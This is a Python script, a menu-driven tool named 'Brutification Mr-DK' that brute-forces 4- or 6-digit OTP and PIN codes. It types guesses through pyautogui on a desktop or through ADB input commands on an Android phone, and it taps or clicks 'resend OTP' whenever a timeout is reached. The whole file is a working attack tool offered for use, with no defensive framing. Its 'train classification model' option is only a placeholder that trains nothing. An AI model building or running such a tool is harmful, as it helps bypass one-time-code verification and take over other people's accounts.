#!/usr/bin/python

import time
import sys
import json
import os
import pyautogui
import random
import subprocess
from sklearn.ensemble import RandomForestClassifier

# File to store settings
SETTINGS_FILE = "bruteforce_settings.json"

# Default settings
default_settings = {
    "otp_length": 4,
    "start_range": 1001,
    "speed": 1.0,
    "timeout": 0,  # 0 means no timeout
    "mode": "sequential",  # Default mode
    "click_locations": [],  # Store multiple click locations
    "tap_x": None,  # For ADB tap on Android
    "tap_y": None,  # For ADB tap on Android
    "classification_model": None  # To store classifier model
}

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_settings():
    if os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, 'r') as f:
            settings = json.load(f)
            for key in default_settings:
                if key not in settings:
                    settings[key] = default_settings[key]
            return settings
    else:
        return default_settings.copy()

def save_settings(settings):
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(settings, f)

def display_menu(settings):
    clear_screen()
    print("\n--- Brutification Mr-DK ---")
    print(f"1. Start brute force (Mode: {settings['mode']})")
    print(f"2. Start ADB brute force on Android (Mode: {settings['mode']})")
    print("3. Set OTP length (4 or 6)")
    print(f"4. Set starting range (current: {settings['start_range']})")
    print(f"5. Set entry speed (current: {settings['speed']} seconds)")
    print(f"6. Set timeout (current: {settings['timeout']} minutes)")
    print(f"7. Set brute force mode (current: {settings['mode']})")
    print(f"8. Set number of click locations (current: {len(settings['click_locations'])})")
    print("9. Train classification model")
    print(f"0. Exit")
    choice = input("Enter your choice (0-9): ")

    if not choice.isdigit() or int(choice) not in range(0, 10):
        print("Invalid choice! Please enter a number between 0 and 9.")
        return display_menu(settings)
    
    return int(choice)

def set_otp_length(settings):
    otp_length = input("Enter OTP length (4 or 6): ")
    if otp_length in ["4", "6"]:
        settings['otp_length'] = int(otp_length)
        save_settings(settings)
    else:
        print("Invalid OTP length! Only 4 or 6 are allowed.")

def set_starting_range(settings):
    start_range = input(f"Enter starting range (current: {settings['start_range']}): ")
    try:
        start_range = int(start_range)
        if start_range < 0:
            raise ValueError
        settings['start_range'] = start_range
        save_settings(settings)
    except ValueError:
        print("Invalid starting range! Please enter a valid number.")

def set_speed(settings):
    speed = input(f"Enter entry speed in seconds (current: {settings['speed']}): ")
    try:
        speed = float(speed)
        if speed <= 0:
            raise ValueError
        settings['speed'] = speed
        save_settings(settings)
    except ValueError:
        print("Invalid speed! Please enter a positive number.")

def set_timeout(settings):
    timeout_input = input(f"Enter timeout in minutes (0 for no timeout, current: {settings['timeout']}): ")
    try:
        timeout = int(timeout_input)
        if timeout < 0:
            raise ValueError
        settings['timeout'] = timeout
        save_settings(settings)
    except ValueError:
        print("Invalid timeout! Please enter a non-negative integer.")

def set_mode(settings):
    mode = input(f"Enter brute force mode ('sequential' or 'random', current: {settings['mode']}): ")
    if mode in ["sequential", "random"]:
        settings['mode'] = mode
        save_settings(settings)
    else:
        print("Invalid mode! Please enter 'sequential' or 'random'.")

def set_click_locations(settings):
    num_locations = input(f"Enter number of click locations (0 to 9, current: {len(settings['click_locations'])}): ")
    try:
        num_locations = int(num_locations)
        if num_locations < 0 or num_locations > 9:
            raise ValueError
        
        settings['click_locations'] = []
        for i in range(num_locations):
            x = int(input(f"Enter X coordinate for click location {i + 1}: "))
            y = int(input(f"Enter Y coordinate for click location {i + 1}: "))
            settings['click_locations'].append((x, y))
        
        save_settings(settings)
    except ValueError:
        print("Invalid number of click locations! Please enter a number between 0 and 9.")

def train_classification_model(settings):
    """Placeholder function for training a model."""
    print("Training model...")
    # In an actual implementation, you would train a machine learning model here.
    # This is just a mock-up to demonstrate the structure.
    clf = RandomForestClassifier(n_estimators=100)
    print("Model trained successfully!")
    settings['classification_model'] = "RandomForest"  # Just a placeholder
    save_settings(settings)

# ADB input and control functions
def adb_input(pin):
    """Send the PIN code to the device via ADB."""
    command = f'adb shell input text {pin}'
    subprocess.run(command, shell=True)

def adb_clear_input():
    """Clear the input by simulating backspace key presses."""
    command = 'adb shell input keyevent 67'
    subprocess.run(command, shell=True)

def adb_tap(x, y):
    """Simulate a tap at the specified screen coordinates."""
    command = f'adb shell input tap {x} {y}'
    subprocess.run(command, shell=True)

def adb_hide_keyboard():
    """Dismiss the on-screen keyboard."""
    command = 'adb shell input keyevent 111'
    subprocess.run(command, shell=True)

# Brute-force function for Android OTP using ADB
def brute_force_android_otp(settings):
    """Brute-force 4-digit PIN codes from start_range to 9999 with a timeout."""
    timeout_seconds = settings['timeout'] * 60
    start_time = time.time()
    current_pin = str(settings['start_range']).zfill(4)

    while True:
        elapsed_time = time.time() - start_time
        if elapsed_time > timeout_seconds:
            print("Timeout reached. Resending OTP and restarting...")
            if settings['tap_x'] is not None and settings['tap_y'] is not None:
                adb_tap(settings['tap_x'], settings['tap_y'])  # Tap to resend OTP
            time.sleep(5)  # Wait for OTP resend
            start_time = time.time()  # Reset timer
            current_pin = str(settings['start_range']).zfill(4)  # Reset PIN

        print(f'Trying PIN: {current_pin}')
        adb_input(current_pin)
        adb_hide_keyboard()
        time.sleep(1)

        next_pin = str(int(current_pin) + 1).zfill(4)
        changes_needed = sum(1 for a, b in zip(current_pin, next_pin) if a != b)

        for _ in range(changes_needed):
            adb_clear_input()
            time.sleep(0.1)

        current_pin = next_pin
        time.sleep(0.5)

# Original brute force for OTP
def brute_force_otp(settings):
    print("Starting brute force in 5 seconds...")
    time.sleep(5)

    max_value = 10**settings['otp_length'] - 1
    start_time = time.time()
    timeout_seconds = settings['timeout'] * 60

    if settings['mode'] == 'sequential':
        otp_range = range(settings['start_range'], max_value + 1)
    elif settings['mode'] == 'random':
        otp_range = random.sample(range(settings['start_range'], max_value + 1), max_value + 1 - settings['start_range'])

    while True:
        for otp in otp_range:
            otp_str = str(otp).zfill(settings['otp_length'])
            pyautogui.hotkey('ctrl', 'a')
            pyautogui.typewrite(otp_str, interval=0.001)
            pyautogui.press('enter')
            time.sleep(settings['speed'])

            if time.time() - start_time > timeout_seconds and timeout_seconds > 0:
                for (x, y) in settings['click_locations']:
                    pyautogui.click(x, y)
                print(f"Timeout reached at {otp_str}. Clicking to resend OTP...")
                start_time = time.time()

def main():
    settings = load_settings()

    while True:
        choice = display_menu(settings)

        if choice == 1:
            brute_force_otp(settings)
        elif choice == 2:
            brute_force_android_otp(settings)
        elif choice == 3:
            set_otp_length(settings)
        elif choice == 4:
            set_starting_range(settings)
        elif choice == 5:
            set_speed(settings)
        elif choice == 6:
            set_timeout(settings)
        elif choice == 7:
            set_mode(settings)
        elif choice == 8:
            set_click_locations(settings)
        elif choice == 9:
            train_classification_model(settings)
        elif choice == 0:
            print("Exiting...")
            break

if __name__ == "__main__":
    main()
